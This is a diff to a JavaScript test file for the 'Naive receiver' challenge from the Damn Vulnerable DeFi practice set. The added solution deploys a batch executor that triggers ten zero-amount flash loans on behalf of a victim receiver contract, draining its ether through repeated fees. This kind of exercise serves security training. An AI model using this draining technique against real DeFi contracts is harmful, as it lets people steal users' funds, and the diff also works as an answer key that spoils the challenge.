@@ -3,6 +3,7 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 
 const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
 const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
+const DamnBatchExecutor = contract.fromArtifact('DamnBatchExecutor');
 
 const { expect } = require('chai');
 
@@ -20,18 +21,24 @@ describe('[Challenge] Naive receiver', function () {
         /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
         this.pool = await LenderPool.new({ from: deployer });
         await web3.eth.sendTransaction({ from: deployer, to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee({ from: deployer })).to.be.bignumber.equal(ether('1'));
 
         this.receiver = await FlashLoanReceiver.new(this.pool.address, { from: user });
         await web3.eth.sendTransaction({ from: user, to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await DamnBatchExecutor.new(
+          Array(10).fill(this.pool.address),
+          Array(10).fill(0),
+          Array(10).fill(this.pool.contract.methods.flashLoan(this.receiver.address, 0).encodeABI()),
+          { from: attacker }
+        );
     });
 
     after(async function () {
